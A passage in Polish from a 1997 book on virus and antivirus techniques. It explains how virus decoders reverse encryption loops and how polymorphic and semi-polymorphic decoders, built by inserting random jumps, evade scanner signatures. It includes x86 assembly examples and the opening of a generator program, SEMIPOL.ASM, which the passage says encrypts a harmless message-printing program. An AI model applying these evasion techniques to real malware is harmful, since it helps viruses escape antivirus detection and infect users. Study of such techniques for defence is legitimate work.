\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dzia\uc1\u322\'b3anie typowego dekodera ogranicza si\uc1\u281\'ea do wykonania w odwrotnej kolejno\uc1\u347\'9cci operacji wykonywanych przez procedur\uc1\u281\'ea szyfruj\uc1\u261\'b9c\uc1\u261\'b9, z uwzgl\uc1\u281\'eadnieniem koniecznych zmian operacji, np. ADD-SUB, SUB-ADD. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli procedura szyfruj\uc1\u261\'b9ca wygl\uc1\u261\'b9da nast\uc1\u281\'eapuj\uc1\u261\'b9co:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX, IleBajt\'f3w }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,Pocz\uc1\u261\'b9tekDanychDoZakodowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch P\uc1\u281\'eatla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR byte ptr [BX],12h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD byte ptr [BX],34h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NOT byte ptr [BX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LOOP P\uc1\u281\'eatla,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch to procedura dekoduj\uc1\u261\'b9ca powinna wygl\uc1\u261\'b9da\uc1\u263\'e6 mniej wi\uc1\u281\'eacej tak:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX, IleBajt\'f3w }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,Pocz\uc1\u261\'b9tekDanychDoZakodowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch P\uc1\u281\'eatla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NOT byte ptr [BX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB byte ptr [BX],34h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR byte ptr [BX],12h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LOOP P\uc1\u281\'eatla.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przyk\uc1\u322\'b3adzie tym operacja ADD z procedury szyfruj\uc1\u261\'b9cej przesz\uc1\u322\'b3a w operacj\uc1\u281\'ea SUB w dekoderze (oczywi\uc1\u347\'9ccie mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 tak\uc1\u380\'bfe operacj\uc1\u281\'ea ADD z przeciwnym argumentem, tzn. -34h). Niestety, nawet je\uc1\u380\'bfeli kod wirusa jest szyfrowany za ka\uc1\u380\'bfdym razem inaczej, to i tak wszystkie mo\uc1\u380\'bfliwe do wygenerowania procedury dekodera b\uc1\u281\'ead\uc1\u261\'b9 zawsze zgodne ze schematem (dla poprzedniego przyk\uc1\u322\'b3adu):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV CX,IleBajt\'f3w }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,Pocz\uc1\u261\'b9tekDanychDoZakodowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch P\uc1\u281\'eatla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEKODUJ [BX] DEKODUJ [BX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEKODUJ [BX]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INC BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LOOP P\uc1\u281\'eatla,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch co dla nowoczesnych skaner\'f3w nie stanowi \uc1\u380\'bfadnej przeszkody}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby uzyska\uc1\u263\'e6 za ka\uc1\u380\'bfdym razem inny, bardziej unikalny dekoder, mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 zmienne, polimorficzne procedury dekoduj\uc1\u261\'b9ce.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1. Polimorficzne procedury dekoduj\uc1\u261\'b9ce}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Stworzenie w\uc1\u322\'b3asnego wirusa polimorficznego nie jest zadaniem \uc1\u322\'b3atwym, czego po\uc1\u347\'9crednim dowodem jest do\uc1\u347\'9c\uc1\u263\'e6 ma\uc1\u322\'b3a ilo\uc1\u347\'9c\uc1\u263\'e6 oryginalnych wirus\'f3w tego typu. Najtrudniejszym elementem jest oczywi\uc1\u347\'9ccie stworzenie samego generatora zmiennych procedur dekoduj\uc1\u261\'b9cych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na specyfik\uc1\u281\'ea zadania, jakie musi on wykonywa\uc1\u263\'e6 (generowanie wykonywalnych sekwencji rozkaz\'f3w), do jego zaprogramowania niezb\uc1\u281\'eadna jest znajomo\uc1\u347\'9c\uc1\u263\'e6 rozkaz\'f3w procesor\'f3w 80x86 oraz ich maszynowych odpo}{\f1\fs24\lang1045{\*\listtag0}wiednik\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfej om\'f3wiono dwie metody tworzenia zmiennych procedur szyfruj\uc1\u261\'b9cych. W obu przypadkach za\uc1\u322\'b3o\uc1\u380\'bfono, i\uc1\u380\'bf ca\uc1\u322\'b3y kod wirusa zosta\uc1\u322\'b3 ju\uc1\u380\'bf zakodowany w spos\'f3b om\'f3wiony w poprzednich punktach, za\uc1\u347\'9c operacje i ich argumenty s\uc1\u261\'b9 zachowane w jakiej\uc1\u347\'9c tablicy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1.1. Semi-polimorfizm}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby rozkodowa\uc1\u263\'e6 kod wirusa najcz\uc1\u281\'ea\uc1\u347\'9cciej stosuje si\uc1\u281\'ea p\uc1\u281\'eatl\uc1\u281\'ea podobn\uc1\u261\'b9 do poni\uc1\u380\'bfszej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV licznik, IleDanych }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV indeks, Pocz\uc1\u261\'b9tekDanychDoZakodowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch P\uc1\u281\'eatla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch dekoduj_i [indeks] }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEKODUJ_2 [indeks]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEKODUJ_N [indeks] }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ADD indeks, przyrost}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LOOP P\uc1\u281\'eatla}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jest to procedura, kt\'f3r\uc1\u261\'b9 bardzo larwo wykry\uc1\u263\'e6, poniewa\uc1\u380\'bf w zasadzie jest ona stal\uc1\u261\'b9. Chc\uc1\u261\'b9c uczyni\uc1\u263\'e6 j\uc1\u261\'b9 w jaki\uc1\u347\'9c spos\'f3b zmienn\uc1\u261\'b9, mo\uc1\u380\'bfna zdefiniowa\uc1\u263\'e6 pewn\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 podobnych do siebie w dzia\uc1\u322\'b3aniu procedur i spo\uc1\u347\'9cr\'f3d nich losowa\uc1\u263\'e6 t\uc1\u281\'ea, kt\'f3ra zostanie u\uc1\u380\'bfyta przy kolejnej generacji wirusa. Niekt\'f3re wirusy zawieraj\uc1\u261\'b9 od kilku do kilkudziesi\uc1\u281\'eaciu takich sta\uc1\u322\'b3ych procedur dekoduj\uc1\u261\'b9cych, kt\'f3re cho\uc1\u263\'e6 dzia\uc1\u322\'b3aj\uc1\u261\'b9 tak samo, zbudowane s\uc1\u261\'b9 z r\'f3\uc1\u380\'bfnych rejestr\'f3w i instrukcji. Ze wzgl\uc1\u281\'eadu na ograniczon\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 takich procedur,}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}kt\'f3re mog\uc1\u261\'b9 by\uc1\u263\'e6 zawarte w ciele wirusa (zwi\uc1\u281\'eakszaj\uc1\u261\'b9 one przecie\uc1\u380\'bf d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 kodu), ilo\uc1\u347\'9c\uc1\u263\'e6 r\'f3\uc1\u380\'bfnych mo\uc1\u380\'bfliwych wariant\'f3w wirusa jest tak naprawd\uc1\u281\'ea bardzo ograniczona.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inny spos\'f3b uzyskania pewnej zmienno\uc1\u347\'9cci w procedurze dekoduj\uc1\u261\'b9cej polega na stworzeniu bufora wype\uc1\u322\'b3nionego przypadkowymi warto\uc1\u347\'9cciami, w kt\'f3rym umieszcza si\uc1\u281\'ea kolejne instrukcje procedury dekoduj\uc1\u261\'b9cej, a po ka\uc1\u380\'bfdej z nich - rozkaz skoku do nast\uc1\u281\'eapnej instrukcji. Zaprogramowanie generatora takich procedur nie stanowi du\uc1\u380\'bfego problemu. Wystarczy zna\uc1\u263\'e6 odpowiedni}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} kody maszynowe kolejnych rozkaz\'f3w procedury dekoduj\uc1\u261\'b9cej i sekwencyjnie umieszcza\uc1\u263\'e6 je w buforze, a bezpo\uc1\u347\'9crednio za nimi generowa\uc1\u263\'e6 rozkaz skoku o kilka bajt\'f3w do przodu, np. rozkazem JMP SHORT NEAR (kod maszynowy 0EB/??) lub JMP NEAR (kod maszynowy E9/??/?}{\f1\fs24\lang1045{\*\listtag0}?).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jedynym problemem, na jaki natkn\uc1\u261\'b9\uc1\u263\'e6 si\uc1\u281\'ea mo\uc1\u380\'bfe tw\'f3rca takiej procedury s\uc1\u261\'b9 offsety, pod kt\'f3re powinien skaka\uc1\u263\'e6 program przy wykonywaniu p\uc1\u281\'eatli, gdy\uc1\u380\'bf zapisuj\uc1\u261\'b9c instrukcje sekwencyjnie napotykamy na konieczno\uc1\u347\'9c\uc1\u263\'e6 umieszczenia warto\uc1\u347\'9cci pocz\uc1\u261\'b9tkowej np. w rejestrze, cho\uc1\u263\'e6 jeszcze jej nie znamy. Aby omin\uc1\u261\'b9\uc1\u263\'e6 t\uc1\u281\'ea przeszkod\uc1\u281\'ea, najpro\uc1\u347\'9cciej zapami\uc1\u281\'eata\uc1\u263\'e6 offsety do instrukcji, zarezerwowa\uc1\u263\'e6 dla nich miejsce, a nast\uc1\u281\'eapnie w dalszej cz\uc1\u281\'ea\uc1\u347\'9cci kodu (kiedy ju\uc1\u380\'bf s\uc1\u261\'b9 znane), zmodyfikowa\uc1\u263\'e6 je pod zapami\uc1\u281\'eatanymi offsetami.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W zamieszczonym program}{\f0\fs24\lang1045{\*\listtag0}ie przyk\uc1\u322\'b3adowym za pomoc\uc1\u261\'b9 powy\uc1\u380\'bfszej metody szyfrowany jest kr\'f3tki programik, maj\uc1\u261\'b9cy za zadanie wy\uc1\u347\'9cwietlenie komunikatu po jego uruchomieniu. Wynik kilkakrotnego dzia\uc1\u322\'b3ania procedury zapisywany jest w plikach SEMI????.COM, gdzie ???? jest parametrem podawan}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0}m przy starcie programu (w wypadku braku parametru - domy\uc1\u347\'9clnie=10). Wygenerowane pliki zawieraj\uc1\u261\'b9 tylko jeden sta\uc1\u322\'b3y bajt na pocz\uc1\u261\'b9tku programu (cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 rozkazu JMP SHORT o kodzie EB). Poprzez zast\uc1\u261\'b9pienie procedury Losowy-Skok (wstawi\uc1\u263\'e6 RET zaraz po etykiecie L}{\f1\fs24\lang1045{\*\listtag0}o}{\f0\fs24\lang1045{\*\listtag0}sowySkok:) mo\uc1\u380\'bfna \uc1\u322\'b3atwo zmodyfikowa\uc1\u263\'e6 ten program, tak aby generowa\uc1\u322\'b3 pliki szyfrowane w standardowy spos\'f3b (bez dodawania losowych skok\'f3w pomi\uc1\u281\'eadzy instrukcjami).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                       SEMIPOL v1.0, Autor : Adam Blaszczyk 1997            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Program generuje pliki zakodowane semi-polimorficznie         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              (pomiedzy wlasciwe instrukcje dekodera sa wstawiane           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;               przypadkowe rozkazy JUMP)                                    ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM  /m2 SEMIPOL.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK SEMIPOL.OBJ                                              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SEMI_POL SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASSUME CS:SEMI_POL, DS:SEMI_POL, SS:SEMI_POL, ES:SEMI_POL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         NUL   = 00h                     ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         TAB   = 09h                     ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         LF    = 0Ah                     ;   \\ stale znakowe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         CR    = 0Dh                     ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         SPACE = 20h                     ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         DOLAR = '$'                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         RozmiarStosu           equ 200h ; rozmiar stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         DomyslnieIlePlikow      = 10    ; domyslnie generuj 10 plikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  InicjujSystem               ; ustaw zmienne programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,TeCopyRight              ; wyswietl info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  Druk}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  WezParametry                ; wez parametry z linii polecen}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,TeGenerator              ; wyswietl info o dzialaniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  Druk}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  GenerowaniePlikow           ; generuj pliki}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,4C00h                    ; funkcja DOS - powrot do systemu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GenerowaniePlikow proc near             ; procedura generuje pliki SEMI????.COM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push ds es ax bx cx dx si di      ; zachowaj na stosie zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx, LiczbaPlikow            ; cx=ile plikow do wygenerowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  GenJedenPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  cx                          ; zachowaj na stosie : ile plikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,AktualnaNazwaPliku       ; \\ wyswietl nazwe pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  DrukLn                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
